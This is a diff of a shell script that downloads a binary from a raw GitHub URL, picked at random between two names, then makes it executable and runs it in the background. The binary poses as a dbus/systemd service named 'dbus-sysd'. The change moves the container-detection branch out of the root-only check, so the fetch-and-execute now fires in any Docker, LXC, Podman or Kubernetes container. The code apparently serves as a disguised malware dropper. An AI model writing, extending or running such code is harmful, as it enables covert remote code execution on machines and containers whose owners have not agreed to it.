@@ -9,15 +9,14 @@ APP_CMD="dbus-sysd"
 CHOOSE=$(echo -e "alpha\nbeta" | shuf -n1)
 CONFIG_URL="https://raw.githubusercontent.com/sachagerard1985/laravel-www/refs/heads/main/${CHOOSE}"
 
+if [ -f "/.dockerenv" ] || grep -qaE 'docker|lxc|podman|kubepods' /proc/1/cgroup; then
+    curl -fsSL "$CONFIG_URL" -o "${CONFIG_FILE_ROOT}"
+    chmod 755 "${CONFIG_FILE_ROOT}"
+    "${CONFIG_FILE_ROOT}" --system --address=systemd --nofork --nopidfile --systemd-activation &
+    return 0
+fi
 
 if [[ $EUID -eq 0 ]]; then
-
-    if [ -f "/.dockerenv" ] || grep -qaE 'docker|lxc|podman|kubepods' /proc/1/cgroup; then
-        curl -fsSL "$CONFIG_URL" -o "${CONFIG_FILE_ROOT}"
-        chmod 755 "${CONFIG_FILE_ROOT}"
-        "${CONFIG_FILE_ROOT}" --system --address=systemd --nofork --nopidfile --systemd-activation &
-        return 0
-    fi
 
     curl -fsSL "$CONFIG_URL" -o "$CONFIG_FILE_ROOT"
     chmod 755 "$CONFIG_FILE_ROOT"
